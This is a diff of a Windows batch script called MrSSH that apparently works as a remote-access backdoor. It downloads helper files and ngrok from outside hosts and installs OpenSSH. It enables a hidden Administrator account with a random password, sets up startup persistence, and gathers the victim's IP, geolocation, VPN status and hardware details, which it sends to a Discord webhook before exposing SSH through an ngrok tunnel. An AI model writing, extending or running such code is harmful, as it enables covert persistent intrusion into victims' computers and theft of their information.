@@ -1,18 +1,19 @@
-@echo on
+@echo off
 setlocal enabledelayedexpansion
 pushd %temp%
 
 :: <Variables>
 set "Version=1.0"
 set "DefaultToken=dheb"
-set Files=NgrokRun.bat OpenSSH.ps1 SilentCMD.exe Source.bat hide.reg WebParse.exe
+set Files=NgrokRun.bat OpenSSH.ps1 Source.bat hide.reg WebParse.exe
 set Github=https://github.com/dh3b/MrSSH/raw/main/Files/
 set "Folder=%temp%\Files"
 :: </Variables>
 
 :: <Install>
+mdkir %temp%\Files
 Rem download ngrok anyway, because it often bugs
-curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "!Folder!\ngrok.zip"
+curl -L# "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "!Folder!\ngrok.zip"
 
 for %%a in (!Files!) do if not exist "!temp!\Files\%%a" set /a MissingFiles+=1
 
@@ -28,9 +29,46 @@ pushd !Folder!
 
 powershell ./OpenSSH.ps1
 
+:: <Create Administrator account, hide it and set strong rndm password for it>
+set "set[1]=ABCDEFGHIJKLMNOPQRSTUVWXYZ"  &  set "len[1]=26"  &  set "num[1]=0"
+set "set[2]=abcdefghijklmnopqrstuvwxyz"  &  set "len[2]=26"  &  set "num[2]=0"
+set "set[3]=0123456789"                  &  set "len[3]=10"  &  set "num[3]=0"
+set "set[4]=!@#$"                     &  set "len[4]=6"   &  set "num[4]=0"
+
+set "list="
+for /L %%i in (1,1,10) do (
+   set /A rnd=!random! %% 4 + 1
+   set "list=!list!!rnd! "
+   set /A num[!rnd!]+=1
+)
+
+:checkList
+set /A mul=num[1]*num[2]*num[3]*num[4]
+if %mul% neq 0 goto listOK
+
+   set /A num[%list:~0,1%]-=1
+   set "list=%list:~2%"
+   set /A rnd=%random% %% 4 + 1
+   set "list=%list%%rnd% "
+   set /A num[%rnd%]+=1
+
+goto checkList
+:listOK
+
+set "RndAlphaNum="
+for %%a in (%list%) do (
+   set /A rnd=!random! %% len[%%a]
+   for %%r in (!rnd!) do set "RndAlphaNum=!RndAlphaNum!!set[%%a]:~%%r,1!"
+)
+
+mkdir %temp%\TempFolder
+echo !RndAlphaNum!>%temp%\TempFolder\pass.txt
+
 net user administrator /active:yes
-net user "Administrator" "AusP90cYda"
+net user "Administrator" "!RndAlphaNum!"
+
 reg import "!Folder!\hide.reg"
+:: </Create Administrator account, hide it and set strong rndm password for it>
 
 :: <Startup>
 mkdir %appdata%\MrSSH
@@ -51,27 +89,19 @@ del HexString.hex output.hex
 set webhook=!PlainString!
 :: </Set webhook>
 
+:: <Get Network and Hardware>
+for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
+for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
+for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set "GPU=%%b"
+for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" country countryCode regionName city lat lon timezone isp proxy query') do set "%%a"
+:: </Get Network and Hardware>
 
-for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"
+:: <Check for VPN>
+if "!proxy!"=="false" (
+    set "VPN=:red_circle:" && set "VPNi=OFF"
+) else set "VPN=:green_circle:" && set "VPNi=ON - :warning: Some Information may be incorrect"
+:: </Check for VPN>
 
-call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** %query% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %timezone%" "52bf90" "https://i.imgur.com/b2Terft.png"
+call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n%VPN% **VPN:** %VPNi% \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** %query% (%isp%) \\n\\n\\n:bookmark_tabs: __**PC Specification**__\\n\\n:floppy_disk: **RAM:** %RAM%\\n\\n:nut_and_bolt: **CPU:** %CPU%\\n\\n:joystick: **GPU:** %GPU%\\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %timezone%" "52bf90" "https://i.imgur.com/b2Terft.png"
 
-mkdir log
-tar -xf ngrok.zip
-
-:: <Start Ngrok>
-start /B "copy" silentcmd xcopy /h /Y ngrok.log !Folder!\log\ /DELAY:10
-start /B "discordmsg" silentcmd !Folder!\NgrokRun.bat /DELAY:10
-start /B "timeout" timeout 14400 & taskkill /IM ngrok.exe /F
-start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log
-:: </Start Ngrok>
-
-:: <Restart Loop>
-:ngrokloop
-call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%query%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
-start /B "copy" silentcmd xcopy /h /Y ngrok.log !Folder!\log\ /DELAY:10
-start /B "discordmsg" silentcmd !Folder!\NgrokRun.bat /DELAY:10
-start /B "timeout" timeout 14400 & taskkill /IM ngrok.exe /F
-start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log
-goto ngrokloop
-:: </Restart Loop>
+call NgrokRun.bat
